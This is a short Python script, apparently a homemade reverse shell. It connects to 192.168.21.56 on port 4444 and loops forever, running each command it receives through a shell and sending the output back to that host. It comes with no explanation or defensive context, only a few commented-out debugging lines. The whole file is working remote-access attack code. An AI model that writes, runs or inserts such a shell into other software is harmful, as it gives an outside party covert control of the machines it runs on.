import socket
import subprocess

con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
con.connect(("192.168.21.56",4444))

def execute_command(command):
    return subprocess.check_output(command,shell=True)


#v = "\nwindows 10 send\n"
#by = v.encode()
#con.send(by)

while True:
    commandrev = con.recv(1024)
    command_result = execute_command(commandrev.decode('utf-8'))
    con.send(command_result)

#sendresult = command_result.encode()
#print(r)
con.close()